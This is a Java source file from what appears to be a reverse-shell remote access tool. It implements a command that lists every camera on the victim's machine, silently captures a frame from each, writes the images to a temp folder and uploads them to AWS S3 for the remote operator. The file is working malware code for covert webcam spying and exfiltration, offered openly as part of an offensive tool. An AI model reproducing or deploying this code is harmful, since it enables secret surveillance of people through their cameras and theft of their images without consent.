package com.mtattab.reverseshell.service.commands;

import com.mtattab.reverseshell.service.Command;
import com.mtattab.reverseshell.util.OSUtil;
import com.mtattab.reverseshell.util.S3UploadUtil;
import org.opencv.core.Core;
import org.opencv.core.Mat;
import org.opencv.core.MatOfByte;
import org.opencv.imgcodecs.Imgcodecs;
import org.opencv.videoio.VideoCapture;

import javax.swing.*;


import java.io.File;
import java.util.ArrayList;
import java.util.List;
import java.util.stream.Collectors;


public class CameraScreenShotCommand extends JFrame implements Command   {
    static {
        nu.pattern.OpenCV.loadLocally();
    }

    public static List<Integer> getAllCameras(){
        System.out.println("OpenCV version: " + Core.VERSION);
        List<Integer> listOfCamera = new ArrayList<>();
        int cameraIndex = 0; // Start with the default camera (index 0)

        while (true) {
            // Open the camera
            VideoCapture camera = new VideoCapture(cameraIndex);

            if (!camera.isOpened()) {
                System.out.println("Error: Camera not opened");
                break;
            }

            System.out.println("Camera " + cameraIndex + " is available");

            // Release the camera
            camera.release();

            listOfCamera.add(cameraIndex);
            // Move to the next camera
            cameraIndex++;
        }

        return listOfCamera;
    }




    public File takePhotosByCameraIndex(Integer cameraIndex){
        VideoCapture camera = new VideoCapture(cameraIndex); // 0 represents the default camera (you can change it based on your setup)

        Mat frame = new Mat();
        camera.read(frame);
        if (areAllPixelsSameColor(frame)){
            System.out.println("image is blank");
            // Release the camera
            camera.release();
            return null;
        }


        String outputPath = "";
        if (!frame.empty()) {
            // Save the image to the tmp
            outputPath = OSUtil.getSystemTmpDir()+ "cameraScreenShot_"+ cameraIndex +".jpg";

            Imgcodecs.imwrite(outputPath, frame);
            System.out.println("Image saved to: " + outputPath);
        } else {
            System.out.println("Error: Could not capture frame");
        }

        // Release the camera
        camera.release();

        return new File(outputPath);
    }


    private static boolean areAllPixelsSameColor(Mat image) {
        // Get the color of the first pixel (reference color)
        double[] referenceColor = image.get(0, 0);

        // Iterate through all pixels and check if they have the same color
        for (int row = 0; row < image.rows(); row++) {
            for (int col = 0; col < image.cols(); col++) {
                double[] pixelColor = image.get(row, col);

                // Compare each channel of the color
                for (int channel = 0; channel < pixelColor.length; channel++) {
                    if (pixelColor[channel] != referenceColor[channel]) {
                        return false; // Pixels have different colors
                    }
                }
            }
        }

        return true; // All pixels have the same color
    }


    private List<File> getCameraScreenShots(List<Integer> listOfCameras){
        List<File> cameraScreenShots = new ArrayList<>();
        for (Integer cameraIndex : listOfCameras) {
            cameraScreenShots.add(takePhotosByCameraIndex(cameraIndex));
        }
//        remove all nulls
        cameraScreenShots = cameraScreenShots.stream()
                .filter(item -> item != null)
                .collect(Collectors.toList());
        System.out.println(cameraScreenShots);
        return cameraScreenShots;
    }


    private List<String> sendPhotosToAwsAndCaptureResponse(List<File> cameraScreenShots){
        List<String> responses = new ArrayList<>();

        for (File cameraScreenShot : cameraScreenShots) {

            if (cameraScreenShot.exists()){
                responses.add("Sent ScreenShot to AWS: "+S3UploadUtil.uploadToS3(cameraScreenShot));
            }else {
                responses.add("ScreenShotNotFound: "+cameraScreenShot.getAbsolutePath());
            }

        }


        return responses;
    }



    @Override
    public String executeCommand(String command) {
        try {
            List<Integer> listOfCameras = getAllCameras();
            if (listOfCameras.isEmpty()){
                return "There is no Cameras Found";
            }

            List<File> cameraScreenShots = getCameraScreenShots(listOfCameras);

            if (cameraScreenShots.isEmpty()){
                return "There is no Cameras Found";
            }

            List<String> awsResponse = sendPhotosToAwsAndCaptureResponse(cameraScreenShots);

            return "Sent ScreenShot and received the following: "+ awsResponse;



        }catch (Exception e){
            e.printStackTrace();
            return "[-] Exception occurred while taking camera ScreenShots: "+e.getMessage() ;
        }


    }








}



